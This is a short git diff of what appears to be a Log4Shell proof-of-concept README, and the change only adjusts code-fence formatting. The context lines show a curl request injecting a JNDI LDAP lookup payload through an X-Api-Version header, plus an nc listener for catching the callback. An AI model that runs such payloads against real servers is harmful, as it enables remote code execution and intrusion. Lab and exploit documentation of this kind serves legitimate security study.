@@ -61,11 +61,9 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/
 
 * To confirm that the code execution was successful, spawn a nc listener with nc -nvlp 80:
 
-```
 $ nc -nvlp 80
-
 ![image](https://user-images.githubusercontent.com/17672433/145706013-d69bf99d-6135-45b0-97ff-c7aed0c9cbf0.png)
-
+```
 
 ## Reference
 
